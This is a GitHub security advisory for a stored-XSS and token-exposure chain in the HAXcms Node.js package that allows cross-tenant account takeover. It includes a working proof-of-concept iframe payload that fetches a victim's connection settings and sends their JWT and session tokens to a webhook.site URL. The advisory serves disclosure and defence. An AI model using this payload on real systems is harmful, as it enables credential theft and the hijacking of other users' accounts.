# [H] HAXcms: Mass Token Exfiltration and Cross-Tenant Hijack 

## Summary
Severity: High
Advisory: GHSA-x3x5-7h4h-gwxg
CVE: CVE-2026-46511
CWE: CWE-522, CWE-79, CWE-922
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-x3x5-7h4h-gwxg
Type: github-advisory

## Affected
- npm: `@haxtheweb/haxcms-nodejs` — affected >=0 <26.0.0

## Details
### Summary
An attack chain utilizing **Stored XSS** alongside dynamic token exposure in the `/system/api/connectionSettings` endpoint allows an authenticated attacker to perform a complete cross-tenant account takeover. The API dynamically leaks the active session's authentication tokens (including the `jwt`, `user_token`, `site_token`, and `appstore_token`) into a global JavaScript variable (`window.appSettings`). An attacker can exploit the XSS vulnerability to force a victim's browser to silently fetch their specific connection settings, extract the tokens, and exfiltrate them to an attacker-controlled webhook.

### Details
In `Operations.php` (`connectionSettings()`), the system returns a Javascript object designed to bootstrap the frontend context. This object, `window.appSettings`, acts as a "skeleton key" because it aggregates all necessary operational tokens for the active session. 

While HAXcms correctly relies on the cryptographically signed JWT for backend authentication (preventing Direct Object Reference/IDOR attempts), the CMS fails to secure the tokens themselves. Specifically:
1. **The Vector**: The system is vulnerable to Stored XSS (e.g., via injected `iframe` `srcdoc` or `<video-player>`).
2. **The Exposure**: Because the `connectionSettings` endpoint serves the tokens locally based on the active `PHPSESSID` cookie, any malicious script running in the browser context can intercept these keys.
3. **The Chain**: HAXcms isolates user environments by URL path (`/<username>/`). An attacker can use XSS to force the victim's browser to fetch their *target* username's specific settings via `fetch('/<username>/system/api/connectionSettings')`. Since the browser implicitly attaches the victim's session cookie, the server authenticates the request and returns the victim's valid JWT and tokens.

### PoC
**1. Setup the Webhook Target**
Prepare an external webhook (e.g., `webhook.site`) to receive the stolen data.

**2. Inject the "Kill Chain" Payload**
As an authenticated attacker (e.g., having edit access to any site), inject the following Javascript via the verified Stored XSS vectors (such as checking the HTML Source of a page and writing an `<iframe>`):

```html
<iframe srcdoc="<script>
    const targetUsername = 'bto108'; // Replace with target victim

    fetch(`/${targetUsername}/system/api/connectionSettings`)
      .then(res => res.text())
      .then(data => {
          const s = JSON.parse(data.substring(data.indexOf('{'), data.lastIndexOf('}') + 1));
          
          const uToken = new URL(document.location.origin + s.getUserDataPath).searchParams.get('user_token');
          const sToken = new URL(document.location.origin + s.saveNodePath).searchParams.get('site_token');
          
          let aToken = 'N/A';
          if (s.appStore && s.appStore.params && s.appStore.params.appstore_token) {
              aToken = s.appStore.params.appstore_token;
          }

          // Exfiltrate via Image Request to bypass CORS
          const payload = btoa(JSON.stringify({
              target: targetUsername, 
              jwt: s.jwt, 
              user_token: uToken, 
              site_token: sToken, 
              appstore_token: aToken
          }));
          
          new Image().src = `https://webhook.site/YOUR-WEBHOOK-ID?data=${payload}`;
      });
</script>" style="display:none"></iframe>
```

**3. Execution & Verification**
- When the victim (e.g., user `bto108`) views the compromised page, their browser automatically fires the `fetch` request, silently attaching their active session cookie.
- The server responds with their connection settings.
- The script parses their `jwt`, `user_token`, and other keys, encoding them in base64.
- The attacker receives the full JWT and token dump on their webhook.

*Screenshots confirming the data leakage and webhook capture:*
![Connection Settings Exposure](https://github.com/user-attachments/assets/1aeee4ee-9475-4430-b4d3-3c6254075d11)
![Secondary Settings Leak](https://github.com/user-attachments/assets/7179c1a5-2bfb-4ab6-ba1d-29bcb61a74d3)
![Cross-tenant Exfiltration Console](https://github.com/user-attachments/assets/1abd21ec-fd45-4bd8-ba67-9c0bb19e6b08)
![Webhook Payload Capture](https://github.com/user-attachments/assets/751e5cab-f4ad-4ab4-b276-86bf738f0434)
![Stolen Data Result](https://github.com/user-attachments/assets/a41e15f7-1652-4351-8cc9-a423f6220158)


### Impact
**Critical Severity.** 
This attack completely compromises the primary defense mechanism of the CMS. By stealing the `jwt` and `user_token`, the attacker achieves **total account hijacking** without needing the victim's password. They can emulate the victim perfectly, bypassing standard interface restrictions to perform malicious administrative actions (creating/deleting sites, modifying user access, or uploading malicious content).

The reliance on a global Javascript variable (`window.appSettings`) to store long-lived administrative security tokens creates a devastating chokepoint when combined with XSS.

## References
- https://github.com/haxtheweb/issues/security/advisories/GHSA-x3x5-7h4h-gwxg
- https://nvd.nist.gov/vuln/detail/CVE-2026-46511
- https://github.com/haxtheweb/issues
